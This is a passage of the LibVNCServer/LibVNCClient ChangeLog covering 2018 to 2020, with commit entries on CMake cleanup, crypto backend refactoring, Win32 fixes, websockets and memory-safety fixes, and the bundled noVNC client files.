	* : Merge pull request #367 from veyon/invalid-socket rfbproto: add missing RFB_INVALID_SOCKET

2020-01-13  Christian Beier <dontmind@freeshell.org>

	* examples/camera.c, libvncserver/main.c: Make gettimeofday win32
	workaround usable multiple times

2020-01-13  Christian Beier <dontmind@freeshell.org>

	* TODO: TODO: update

2020-01-13  Christian Beier <dontmind@freeshell.org>

	* compat/msvc/stdint.h, compat/msvc/sys/time.h,
	compat/msvc/unistd.h: compat: remove After d5de72ade0bda406cf67909f3d02c42705f82b4a, this is really
	obsolete.  Closes #365

2020-01-13  Christian Beier <dontmind@freeshell.org>

	* examples/camera.c: examples/camera: include gettimeofday header or
	win32 workaround

2020-01-13  Christian Beier <dontmind@freeshell.org>

	* libvncserver/main.c: LibVNCServer: declare that the gettimeofday
	workaround is win32-only

2020-01-11  Christian Beier <dontmind@freeshell.org>

	* libvncclient/listen.c, libvncclient/sasl.c,
	libvncclient/sockets.c, libvncclient/vncviewer.c,
	libvncserver/httpd.c, libvncserver/rfbserver.c,
	libvncserver/sockets.c, rfb/rfbproto.h: Use platform-specific
	function for closing sockets Closes #329

2020-01-11  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, cmake/Modules/FindFFMPEG.cmake: CMake: update
	FindFFMPEG module Thankfully stolen from
	https://github.com/Kitware/VTK/blob/master/CMake/FindFFMPEG.cmake at
	bf45b5ebeafca7e68551146f2e48b301a000cb75 Closes #366

2020-01-09  Christian Beier <dontmind@freeshell.org>

	* common/crypto_included.c: crypto: fix compilation with MSVC using
	included crypto

2020-01-09  Christian Beier <dontmind@freeshell.org>

	* rfb/rfbproto.h: rfb/rfbproto: keep non-Windows SOCKET define as
	user code might have used it

2020-01-08  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #361 from tsdgeos/fix_shutdown rfbShutdownServer: Call rfbClientConnectionGone if no backgroundLoop

2019-12-28  Christian Beier <dontmind@freeshell.org>

	* README.md: README: describe crypto support

2019-12-27  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, rfb/rfbconfig.h.cmakein: CMake: cleanup crypto
	inclusion

2019-12-18  Christian Beier <dontmind@freeshell.org>

	* common/crypto_included.c, common/crypto_libgcrypt.c,
	common/crypto_openssl.c: crypto: update boilerplate comments

2019-12-18  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, common/{rfbcrypto.h => crypto.h},
	common/{rfbcrypto_included.c => crypto_included.c},
	common/{rfbcrypto_libgcrypt.c => crypto_libgcrypt.c},
	common/{rfbcrypto_openssl.c => crypto_openssl.c}, common/vncauth.c,
	libvncclient/rfbproto.c, libvncserver/websockets.c: crypto: remove
	the 'rfb' prefix from files

2019-12-18  Christian Beier <dontmind@freeshell.org>

	* common/rfbcrypto.h, common/rfbcrypto_included.c,
	common/rfbcrypto_libgcrypt.c, common/rfbcrypto_openssl.c: crypto:
	ensure that encrypt_aes128ecb() gets a 16-byte key

2019-12-18  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, common/rfbcrypto.h, common/rfbcrypto_included.c,
	common/rfbcrypto_libgcrypt.c, common/rfbcrypto_openssl.c,
	common/vncauth.c, libvncclient/rfbproto.c: crypto: move d3des into
	crypto system When using OpenSSL or Libgcrypt backends, their implementations of
	D3DES are used.

2019-12-09  Christian Beier <dontmind@freeshell.org>

	* common/d3des.c, common/d3des.h: common/d3des: make rfbUseKey()
	implementation-private

2019-12-09  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, common/md5.c, common/md5.h,
	common/rfbcrypto_included.c: crypto: remove unused included md5
	implementation

2019-12-09  Christian Beier <dontmind@freeshell.org>

	* common/rfbcrypto_included.c: crypto: implement hash_sha1 for
	included crypto, used by websockets

2019-12-09  Christian Beier <dontmind@freeshell.org>

	* common/rfbcrypto_included.c: crypto: implement stubs for included
	crypto

2019-12-09  Christian Beier <dontmind@freeshell.org>

	* .travis.yml: TravisCI: use different encryption setups, not
	compilers

2019-12-08  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, common/rfbcrypto_openssl.c: crypto: make OpenSSL
	version work with OpenSSL < 1.1.0 and LibreSSL

2019-12-08  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: remove check for sys/uio.h

2019-12-08  Christian Beier <dontmind@freeshell.org>

	* common/rfbcrypto.h, common/rfbcrypto_included.c,
	common/rfbcrypto_libgcrypt.c, common/rfbcrypto_openssl.c: crypto:
	remove functions depending on sys/uio.h

2019-12-08  Christian Beier <dontmind@freeshell.org>

	* libvncserver/websockets.c: websockets: use hash_sha1() instead of
	digestsha1()

2019-12-07  Christian Beier <dontmind@freeshell.org>

	* common/rfbcrypto.h, common/rfbcrypto_libgcrypt.c,
	common/rfbcrypto_openssl.c: crypto: add hash_sha1() to OpenSSL and
	Libgrypt versions

2019-12-07  Christian Beier <dontmind@freeshell.org>

	* common/rfbcrypto_openssl.c: crypto: implement missing OpenSSL
	functions We can now do libvncclient ARD auth with OpenSSL

2019-12-07  Christian Beier <dontmind@freeshell.org>

	* common/rfbcrypto_libgcrypt.c: crypto: update boilerplate comment
	for rfbcrypto_libgcrypt

2019-12-07  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, common/rfbcrypto.h, common/rfbcrypto_libgcrypt.c,
	libvncclient/rfbproto.c: crypto: move libvncclient's gcrypt-related
	functionality into common

2019-12-05  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #355 from veyon/misc Minor const/unsigned improvements

2019-12-05  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #353 from veyon/endianess-win32 rfbproto: fix broken endianess handling on Win32

2019-12-05  Tobias Junghans <tobydox@veyon.io>

	* libvncclient/sockets.c, rfb/rfbclient.h: rfbClient: make buffered
	unsigned

2019-12-05  Tobias Junghans <tobydox@veyon.io>

	* libvncclient/sockets.c, rfb/rfbclient.h: Make buffer size of
	WriteToRFBServer() unsigned Like ReadFromRFBServer() the number of bytes to write should always
	be positive.

2019-12-05  Tobias Junghans <tobydox@veyon.io>

	* rfb/rfbproto.h: rfbproto: fix broken endianess handling on Win32 It's definitely wrong to build with LIBVNCSERVER_WORDS_BIGENDIAN
	defined on Win32. Instead use the auto-detected endianess macro
	(which will indicate little endian on i686/x86_64). Removing the
	hardcoded define makes all tests pass (especially encodingtest) when
	built with the MinGW64 toolchain.  In combination with PR #257 this fixes issues #165 and #249.

2019-11-21  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: patchlevel up, next version is 0.9.13

2019-11-17  Christian Beier <dontmind@freeshell.org>

	* libvncclient/cursor.c: libvncclient/cursor: limit width/height
	input values Avoids a possible heap overflow reported by Pavel Cheremushkin
	<Pavel.Cheremushkin@kaspersky.com>.  re #275

2019-11-17  Christian Beier <dontmind@freeshell.org>

	* SECURITY.md: Create SECURITY.md

2019-11-17  Christian Beier <dontmind@freeshell.org>

	* examples/repeater.c, libvncclient/rfbproto.c: Catch too long input
	string case in repeater functionality

2019-11-17  Christian Beier <dontmind@freeshell.org>

	* examples/repeater.c: examples/repeater: honour that snprintf limit
	includes terminating 0

2019-11-17  Christian Beier <dontmind@freeshell.org>

	* examples/repeater.c, libvncclient/rfbproto.c: When connecting to a
	repeater, make sure to not leak memory Really closes #253

2019-11-17  Christian Beier <dontmind@freeshell.org>

	* examples/repeater.c, libvncclient/rfbproto.c: Revert "When
	connecting to a repeater, only send initialised string" This broke repeater funcionality, re #346.  This reverts commit 8b06f835e259652b0ff026898014fc7297ade858.

2019-10-24  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #342 from samhed/master Use binary encoding as default instead of base64

2019-09-30  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #340 from
	dcommander/tight-raw-decoding-regression LibVNCClient: Fix regression in Tight/Raw decoding

2019-08-26  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #334 from veyon/fix-header-inclusion LibVNCServer: fix inclusion of own headers

2019-08-19  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbserver.c: rfbserver: don't leak stack memory to
	the remote Thanks go to Pavel Cheremushkin of Kaspersky for reporting.

2019-07-31  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #327 from veyon/openssl-pthread LibVNCClient: tls_openssl: include pthread.h early

2019-07-28  Christian Beier <dontmind@freeshell.org>

	* libvncserver/sockets.c: LibVNCServer: fix a for loop for C90

2019-07-28  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: specify that we use C90

2019-07-28  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, libvncserver/main.c, libvncserver/sockets.c,
	rfb/rfb.h, rfb/rfbconfig.h.cmakein: LibVNCServer: avoid accept()
	giving EMFILE When enough connections were opened with the target server so that
	all available file descriptors were consumed, the server would enter
	an infinite loop which would cause an error message to be printed to
	the log file at a rapid rate, causing 100% CPU utilisation.  Avoid this case by introducing a configurable limit of open file
	descriptors that the library is allowed to make use of before
	denying new client connections.

2019-07-24  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #325 from veyon/trle-fixes trle: add missing variable initializations

2019-07-16  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #324 from veyon/fix-bitmask-inversion vncclient/rfbproto: invert bitmask using bitwise NOT

2019-07-16  Tobias Junghans <tobydox@veyon.io>

	* libvncclient/rfbproto.c: rfbproto: invert bitmask using bitwise
	NOT Inverting a bitmask should be done using a bitwise NOT instead of a
	logical NOT.

2019-07-10  Christian Beier <dontmind@freeshell.org>

	* client_examples/SDLvncviewer.c: SDLvncviewer: document how to use
	it Closes #323

2019-07-05  Christian Beier <dontmind@freeshell.org>

	* README.md: README: update Basics Especially, remove the sections about Java applets and modems :-) re #321

2019-07-05  Christian Beier <dontmind@freeshell.org>

	* README.md: README: add some links to examples and Internet
	resources re #321

2019-07-03  Christian Beier <dontmind@freeshell.org>

	* .github/ISSUE_TEMPLATE/bug_report.md,
	.github/ISSUE_TEMPLATE/feature_request.md: Update issue templates

2019-07-03  Christian Beier <dontmind@freeshell.org>

	* .github/FUNDING.yml: FUNDING.yml: add issuehunt

2019-07-03  Christian Beier <dontmind@freeshell.org>

	* libvncserver/websockets.c: websockets: fix length check siezof() a malloc'ed buffer returns the size of the pointer

2019-05-28  Rolf Eike Beer <eike@sf-mail.de>

	* CMakeLists.txt: CMake: use the correct mechanism to pass include
	dirs to a check program This especially works in case the module returns more than one
	directory.

2019-05-28  Rolf Eike Beer <eike@sf-mail.de>

	* CMakeLists.txt, libvncclient.pc.cmakein, libvncserver.pc.cmakein,
	rfb/rfbconfig.h.cmakein: CMake: use the builtin mechanism to set a
	version number

2019-05-28  Rolf Eike Beer <eike@sf-mail.de>

	* CMakeLists.txt: CMake: remove needless policy setting CMP0037 was introduced in 3.0 and is set to NEW automatically if a
	newer version is required.

2019-07-02  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #302 from condo4/fix_warning Fix warning

2019-05-09  Jae Hyun Yoo <jae.hyun.yoo@linux.intel.com>

	* libvncserver/rfbserver.c, rfb/rfb.h: rfbserver: add a hooking
	function to deliver rfbFramebufferUpdateRequest messages.  This commit adds a hooking function to deliver
	rfbFramebufferUpdateRequest messages from clients to the frame
	producer for a case the producer needs to handle the messages for
	flow control or etc.

2019-05-28  Rolf Eike Beer <eike@sf-mail.de>

	* CMakeLists.txt: CMake: do not use obsolete install commands

2019-05-28  Rolf Eike Beer <eike@sf-mail.de>

	* CMakeLists.txt: CMake: do not manually create the output
	directories Some binaries are configured to show up in these directories, so
	CMake will create them automatically.

2019-06-30  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #307 from anszom/bgpipe-bugfix rfbserver: don't close fd 0 accidentally

2019-06-30  Christian Beier <dontmind@freeshell.org>

	* libvncserver/websockets.c: websockets: add boundary check to
	reading of key3 Thanks to Dane <dslh.4cad@gmail.com> for reporting this!

2019-06-30  Dane (4cad@silvertoque) <dslh.4cad@gmail.com>

	* libvncserver/tightvnc-filetransfer/handlefiletransferrequest.c: 
	tightvnc-filetransfer: check dir name in HandleFileCreateDirRequest

2019-06-27  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #316 from rajesh6115/master avoid pthread_join if backgroundLoop is FALSE

2019-06-26  Christian Beier <dontmind@freeshell.org>

	* README.md: README: update liberapay badge

2019-06-23  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #317 from ffontaine/master CMakeLists.txt: fix build without C++

2019-06-21  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #306 from puleglot/gcrypt-crypto crypto: rfbcrypto_gnutls is actually libgcrypt-based

2019-05-28  Rolf Eike Beer <eike@sf-mail.de>

	* libvncserver/ws_decode.c: fix crash because of unaligned accesses
	in hybiReadAndDecode()

2019-05-28  Andrzej Szombierski <qq@kuku.eu.org>

	* libvncserver/rfbserver.c: rfbserver: don't close fd 0 accidentally pipe_notify_client_thread needs to be initialized to -1

2019-05-25  Alexander Tsoy <alexander@tsoy.me>

	* CMakeLists.txt, common/{rfbcrypto_gnutls.c =>
	rfbcrypto_libgcrypt.c}: crypto: rfbcrypto_gnutls is actually
	libgcrypt-based Long time ago gnutls used libgcrypt as a cryptographic backend.
	Perhaps that was what caused the confusion.

2019-05-21  Christian Beier <cb@shoutrlabs.com>

	* README.md: README: update legal part

2019-05-21  Christian Beier <cb@shoutrlabs.com>

	* README.md: README: improve contact wording

2019-05-15  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #305 from veyon/fix-stringop-truncation LibVNCClient: fix potentially missing null byte

2019-05-09  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbserver.c: rfbserver: do not log other clients on
	client connect Instead, log a cumulative count. This prevents a potentially
	dangerous log file size escalation when there are many clients
	connected.

2019-05-04  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: add option to disable install target
	generation This is a convenience feature for users that use LibVNCServer within
	a nested CMake environment and don't want its install targets in
	their app.

2019-04-30  Fabien Proriol <fabien.proriol@viavisolutions.com>

	* libvncclient/trle.c: trle: Fix cast warning with buffer Remove warning: pointer targets in passing argument 2 of
	âReadFromRFBServerâ differ in signedness [-Wpointer-sign]

2019-04-30  Fabien Proriol <fabien.proriol@viavisolutions.com>

	* libvncclient/trle.c: trle: Remove unused case for switch Remove warning: label âcase_0â defined but not used
	[-Wunused-label]

2019-04-29  Christian Beier <dontmind@freeshell.org>

	* README.md: README: update contact info

2019-04-26  Sebastian Kranz <s.kranz@plastcontrol.de>

	* libvncserver/ws_decode.c: BUGFIX: Assuming the header is always a
	minimum of 14 Bytes long is not correct according to the RFC 6455
	spec, it can be as short as 2 Bytes. Using it in combination with
	the RFB protocol, which tells that a client message can be as short
	as 6 Bytes, leads to reading past the end of a message. The proposal
	is to use WS_HYBI_HEADER_LEN_SHORT instead of WSHLENMAX to read only
	a minimum header, then reading the rest of the header if it is
	longer. Original finding here:
	https://github.com/LibVNC/libvncserver/issues/297

2019-04-21  Christian Beier <dontmind@freeshell.org>

	* .travis.yml: TravisCI: switch Linux builds to Ubuntu 16.04

2019-04-20  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: unset PNG_LIBRARIES in case PNG was not
	found

2019-04-19  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: generate rfbconfig.h in
	CMAKE_CURRENT_BINARY_DIR This helps including the repo as a submodule in other CMake-based
	projects.

2019-04-19  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: look for modules in
	CMAKE_CURRENT_SOURCE_DIR

2019-04-15  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: export compile_commands.json

2019-04-08  Christian Beier <cb@shoutrlabs.com>

	* README.md: README: document how to try out Websockets Closes #295

2019-04-06  Christian Beier <dontmind@freeshell.org>

	* libvncclient/sockets.c: libvncclient: bail out if unix socket name
	would overflow Closes #291

2019-04-06  Christian Beier <dontmind@freeshell.org>

	* rfb/rfbclient.h: doxygen: document GotFrameBufferUpdate() and
	FinishedFrameBufferUpdate() Closes #292

2019-03-28  Christian Beier <dontmind@freeshell.org>

	* libvncclient.pc.cmakein, libvncserver.pc.cmakein: CMake: replace
	'lib' with ${CMAKE_INSTALL_LIBDIR} for pkgconfig files as well Thanks to https://github.com/ikelos for spotting this ;-) Closes #290

2019-02-09  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: replace hardcoded 'lib' with
	${CMAKE_INSTALL_LIBDIR} Closes #281

2019-01-09  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #276 from
	ppisar/rfbProcessFileTransferReadBuffer-max_int Limit lenght to INT_MAX bytes in rfbProcessFileTransferReadBuffer()

2019-01-06  Christian Beier <dontmind@freeshell.org>

	* ChangeLog: Update ChangeLog

2019-01-06  Christian Beier <dontmind@freeshell.org>

	* rfb/rfb.h: Move pipe_notify_client_thread to end of rfbClientRec in order to retain ABI compatibility.

2019-01-06  Christian Beier <dontmind@freeshell.org>

	* libvncserver/main.c: Fix comment style and be a bit more verbose ... explaining cedae6e6f97b14f5df3ea7c5f7efd59f2bc9ad82.

2019-01-06  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #238 from tetrane/pr-fix-use-after-free Fix use-after-free and concurrent access segmentation fault

2019-01-06  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: require stdint.h This is used at quite a few places in the code, so make it
	mandatory.

2019-01-06  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbserver.c: Error out in
	rfbProcessFileTransferReadBuffer if length can not be allocated re #273

2019-01-06  Christian Beier <dontmind@freeshell.org>

	* libvncclient/rfbproto.c: LibVNCClient: remove now-useless cast re #273

2019-01-06  Christian Beier <dontmind@freeshell.org>

	* libvncclient/rfbproto.c: LibVNCClient: fail on server-sent desktop
	name lengths longer than 1MB re #273

2019-01-05  Christian Beier <dontmind@freeshell.org>

	* .appveyor.yml: AppVeyorCI: update cyrus-sasl URL

2018-12-29  Christian Beier <dontmind@freeshell.org>

	* README.md: README: link LiberaPay team account

2018-12-29  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #267 from veyon/external-lzo Allow to use global LZO library instead of miniLZO

2018-12-29  Christian Beier <dontmind@freeshell.org>

	* libvncclient/rfbproto.c: LibVNCClient: ignore server-sent cut text
	longer than 1MB This is in line with how LibVNCServer does it (28afb6c537dc82ba04d5f245b15ca7205c6dbb9c) and fixes part of #273.

2018-12-28  Christian Beier <dontmind@freeshell.org>

	* .appveyor.yml, deps/sasl-fix-snprintf-macro.patch: Revert
	"AppVeyorCI: update cyrus-sasl to 2.1.27, remove patch" This reverts commit bcd3eaeb83181ab5491aa6d641e2a7b8d424d88a.

2018-12-28  Christian Beier <dontmind@freeshell.org>

	* .appveyor.yml, deps/sasl-fix-snprintf-macro.patch: AppVeyorCI:
	update cyrus-sasl to 2.1.27, remove patch

2018-12-28  Christian Beier <dontmind@freeshell.org>

	* .gitignore: .gitignore: remove autotools and x11vnc leftovers

2018-12-28  Christian Beier <dontmind@freeshell.org>

	* .gitignore: .gitignore: fix for in-tree builds, add 'build' dir re #248

2018-12-28  Christian Beier <dontmind@freeshell.org>

	* .gitignore: Revert "Remove .gitignore obsoleted by CMake" This reverts commit d6c907ffbc36f4ad7663a44538b15e650a6ddf40.

2018-12-06  Quentin BUATHIER <qbuathier@tetrane.com>

	* libvncserver/main.c: Check the return code of pipe

2018-11-29  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #269 from rgacogne/fix-misleading-indentation Fix -Wmisleading-indentation warnings

2018-11-28  Remi Gacogne <rgacogne@coredump.fr>

	* libvncserver/rfbssl_gnutls.c: LibVNCServer: Fix 'logical not is
	only applied to the..' warnings

2018-11-22  Tobias Junghans <tobydox@veyon.io>

	* .travis.yml, CMakeLists.txt, cmake/Modules/FindLZO.cmake,
	libvncclient/rfbproto.c, libvncserver/ultra.c,
	rfb/rfbconfig.h.cmakein: Allow to use global LZO library instead of
	miniLZO The complete LZO library nowadays is installed on many systems so we
	can optionally make use of it and omit internal miniLZO
	implementation.

2018-11-19  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #259 from veyon/cursor-shift LibVNCClient: fix integer shifts for cursor colors

2018-11-07  Tobias Junghans <tobydox@veyon.io>

	* libvncserver/tight.c, libvncserver/zlib.c: LibVNCServer: properly
	use thread-local storage The TLS macro never has been defined due to the missing
	LIBVNCSERVER_HAVE_TLS macro. This revises the macro logic to also
	cover Win32 builds with MSVC.

2018-11-18  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #263 from veyon/custom-auth-handlers LibVNCClient: add support for custom auth handlers

2018-11-11  Christian Beier <dontmind@freeshell.org>

	* libvncserver/cargs.c: Add SSL options to rfbUsage  output

2018-11-10  Christian Beier <dontmind@freeshell.org>

	* libvncserver/tightvnc-filetransfer/handlefiletransferrequest.c: 
	tightvnc-filetransfer: do not close stuff from within a thread ... as this crashes badly and the client is closed by the main
	thread machinery afterwards.  re #242

2018-11-09  Christian Beier <dontmind@freeshell.org>

	* README, README.md: README: rename to README.md We had the original name lingering on for the Autotools packaging
	process, but that is gone since.

2018-11-07  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #261 from veyon/misc-fixes Misc fixes

2018-11-07  Tobias Junghans <tobydox@veyon.io>

	* common/d3des.c: common: d3des: use per-thread key register When encrypting/decrypting from different threads this can race due
	to the global key register.

2018-11-07  Tobias Junghans <tobydox@veyon.io>

	* common/d3des.c, common/d3des.h, libvncclient/rfbproto.c: common:
	d3des: drop unused rfbCPKey()

2018-11-07  Tobias Junghans <tobydox@veyon.io>

	* common/d3des.c: common: d3des: make static arrays const

2018-11-06  Tobias Junghans <tobydox@veyon.io>

	* libvncclient/tls.h, libvncclient/tls_gnutls.c,
	libvncclient/tls_none.c, libvncclient/tls_openssl.c: LibVNCClient:
	pass buffer as const to WriteToTLS()

2018-11-06  Tobias Junghans <tobydox@veyon.io>

	* rfb/default8x16.h: rfb: add header guard for default8x16

2018-11-06  Tobias Junghans <tobydox@veyon.io>

	* libvncclient/sasl.c, libvncclient/sockets.c,
	libvncserver/sockets.c: Undef error codes before redefining them for
	WSA Fixes compiler warnings about redefined macros from errno.h.

2018-11-06  Tobias Junghans <tobydox@veyon.io>

	* libvncclient/rfbproto.c: LibVNCClient: init pad field for set
	encodings msg

2018-11-06  Tobias Junghans <tobydox@veyon.io>

	* README: README: add Veyon to projects using libvncserver

2018-11-05  Christian Beier <dontmind@freeshell.org>

	* README: README. add a reference to client examples Closes #224

2018-11-05  Christian Beier <dontmind@freeshell.org>

	* README: README: add VirtualBox to projects using us

2018-11-05  Christian Beier <dontmind@freeshell.org>

	* README: README: fix header structure, add some markups for
	commands

2018-11-05  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #260 from veyon/free-client-buffers LibVNCClient: free buffers in rfbClientCleanup()

2018-11-05  Tobias Junghans <tobydox@veyon.io>

	* libvncserver/cursor.c: LibVNCClient: fix integer shifts for cursor
	colors Shifting values > 32768 by 16 places can cause undefined results for
	signed integers. Therefore cast color components to unsigned integer
	before shifting.

2018-10-22  Christian Beier <dontmind@freeshell.org>

	* libvncserver/tightvnc-filetransfer/handlefiletransferrequest.c: 
	tightvnc-filetransfer: when creating a new download thread, make
	sure the previous one ends re #242

2018-10-21  Christian Beier <dontmind@freeshell.org>

	* libvncserver/tightvnc-filetransfer/filetransfermsg.c,
	libvncserver/tightvnc-filetransfer/rfbtightserver.c: 
	tightvnc-filetransfer: wait for download thread end in
	CloseUndoneFileDownload() ...and use it when deregistering the file transfer extension.  Closes #242

2018-10-21  Christian Beier <dontmind@freeshell.org>

	* libvncserver/tightvnc-filetransfer/filetransfermsg.c,
	libvncserver/tightvnc-filetransfer/filetransfermsg.h,
	libvncserver/tightvnc-filetransfer/handlefiletransferrequest.c: 
	tightvnc-filetransfer: refactor CloseUndoneFileTransfer() into two
	functions ...for closing upload and download separately.  re #242

2018-10-21  Christian Beier <dontmind@freeshell.org>

	* libvncserver/tightvnc-filetransfer/handlefiletransferrequest.c,
	libvncserver/tightvnc-filetransfer/rfbtightproto.h: 
	tightvnc-filetransfer: tie the download thread to the control
	structure re #242

2018-10-21  Christian Beier <dontmind@freeshell.org>

	* libvncserver/tightvnc-filetransfer/handlefiletransferrequest.c: 
	tightvnc-filetransfer: fix heap use-after-free One can only guess what the intended semantics were here, but as
	every other rfbCloseClient() call in this file is followed by an
	immediate return, let's assume this was forgotton in this case.  Anyway, don't forget to clean up to not leak memory.  Closes #241

2018-10-21  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbserver.c: LibVNCServer: fix heap out-of-bound
	write access Closes #243

2018-10-04  Christian Beier <dontmind@freeshell.org>

	* libvncclient/corre.c: LibVNCClient: really fix #250

2018-10-01  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbserver.c, libvncserver/websockets.c: websockets:
	remove Flash fallback Closes #162

2018-10-01  Christian Beier <dontmind@freeshell.org>

	* webclients/index.vnc, webclients/novnc/LICENSE.txt,
	webclients/novnc/README.md, webclients/novnc/app/error-handler.js,
	webclients/novnc/app/images/alt.svg,
	webclients/novnc/app/images/clipboard.svg,
	webclients/novnc/app/images/connect.svg,
	webclients/novnc/app/images/ctrl.svg,
	webclients/novnc/app/images/ctrlaltdel.svg,
	webclients/novnc/app/images/disconnect.svg,
	webclients/novnc/app/images/drag.svg,
	webclients/novnc/app/images/error.svg,
	webclients/novnc/app/images/esc.svg,
	webclients/novnc/app/images/expander.svg,
	webclients/novnc/app/images/fullscreen.svg,
	webclients/novnc/app/images/handle.svg,
	webclients/novnc/app/images/handle_bg.svg,
	webclients/novnc/app/images/icons/Makefile,
	webclients/novnc/app/images/icons/novnc-icon-sm.svg,
	webclients/novnc/app/images/icons/novnc-icon.svg,
	webclients/novnc/app/images/info.svg,
	webclients/novnc/app/images/keyboard.svg,
	webclients/novnc/app/images/mouse_left.svg,
	webclients/novnc/app/images/mouse_middle.svg,
	webclients/novnc/app/images/mouse_none.svg,
	webclients/novnc/app/images/mouse_right.svg,
	webclients/novnc/app/images/power.svg,
	webclients/novnc/app/images/settings.svg,
	webclients/novnc/app/images/tab.svg,
	webclients/novnc/app/images/toggleextrakeys.svg,
	webclients/novnc/app/images/warning.svg,
	webclients/novnc/app/locale/de.json,
	webclients/novnc/app/locale/el.json,
	webclients/novnc/app/locale/es.json,
	webclients/novnc/app/locale/nl.json,
	webclients/novnc/app/locale/pl.json,
	webclients/novnc/app/locale/sv.json,
	webclients/novnc/app/locale/tr.json,
	webclients/novnc/app/locale/zh.json,
	webclients/novnc/app/localization.js,
	webclients/novnc/app/sounds/CREDITS,
	webclients/novnc/app/styles/base.css,
	webclients/novnc/app/styles/lite.css, webclients/novnc/app/ui.js,
	webclients/novnc/app/webutil.js, webclients/novnc/{include =>
	core}/base64.js, webclients/novnc/{include => core}/des.js,
	webclients/novnc/core/display.js,
	webclients/novnc/core/encodings.js,
	webclients/novnc/core/inflator.js,
	webclients/novnc/core/input/domkeytable.js,
	webclients/novnc/core/input/fixedkeys.js,
	webclients/novnc/core/input/keyboard.js,
	webclients/novnc/core/input/keysym.js,
	webclients/novnc/core/input/keysymdef.js,
	webclients/novnc/core/input/mouse.js,
	webclients/novnc/core/input/util.js,
	webclients/novnc/core/input/vkeys.js,
	webclients/novnc/core/input/xtscancodes.js,
	webclients/novnc/core/rfb.js,
	webclients/novnc/core/util/browser.js,
	webclients/novnc/core/util/events.js,
	webclients/novnc/core/util/eventtarget.js,
	webclients/novnc/core/util/logging.js,
	webclients/novnc/core/util/polyfill.js,
	webclients/novnc/core/util/strings.js,
	webclients/novnc/core/websock.js, webclients/novnc/favicon.ico,
	webclients/novnc/include/base.css,
	webclients/novnc/include/black.css,
	webclients/novnc/include/blue.css,
	webclients/novnc/include/chrome-app/tcp-client.js,
	webclients/novnc/include/display.js,
	webclients/novnc/include/input.js,
	webclients/novnc/include/jsunzip.js,
	webclients/novnc/include/keyboard.js,
	webclients/novnc/include/keysym.js,
	webclients/novnc/include/keysymdef.js,
	webclients/novnc/include/logo.js,
	webclients/novnc/include/playback.js,
	webclients/novnc/include/rfb.js, webclients/novnc/include/ui.js,
	webclients/novnc/include/util.js,
	webclients/novnc/include/web-socket-js/README.txt,
	webclients/novnc/include/web-socket-js/swfobject.js,
	webclients/novnc/include/web-socket-js/web_socket.js,
	webclients/novnc/include/websock.js,
	webclients/novnc/include/webutil.js,
	webclients/novnc/vendor/browser-es-module-loader/.npmignore,
	webclients/novnc/vendor/browser-es-module-loader/README.md,
	webclients/novnc/vendor/browser-es-module-loader/dist/babel-worker.
	js,
	webclients/novnc/vendor/browser-es-module-loader/dist/browser-es-mo
	dule-loader.js,
	webclients/novnc/vendor/browser-es-module-loader/dist/browser-es-mo
	dule-loader.js.map,
	webclients/novnc/vendor/browser-es-module-loader/rollup.config.js,
	webclients/novnc/vendor/browser-es-module-loader/src/babel-worker.j
	s,
	webclients/novnc/vendor/browser-es-module-loader/src/browser-es-mod
	ule-loader.js, webclients/novnc/vendor/pako/LICENSE,
	webclients/novnc/vendor/pako/README.md,
	webclients/novnc/vendor/pako/lib/utils/common.js,
	webclients/novnc/vendor/pako/lib/zlib/adler32.js,
	webclients/novnc/vendor/pako/lib/zlib/constants.js,
	webclients/novnc/vendor/pako/lib/zlib/crc32.js,
	webclients/novnc/vendor/pako/lib/zlib/deflate.js,
	webclients/novnc/vendor/pako/lib/zlib/gzheader.js,
	webclients/novnc/vendor/pako/lib/zlib/inffast.js,
	webclients/novnc/vendor/pako/lib/zlib/inflate.js,
	webclients/novnc/vendor/pako/lib/zlib/inftrees.js,
	webclients/novnc/vendor/pako/lib/zlib/messages.js,
	webclients/novnc/vendor/pako/lib/zlib/trees.js,
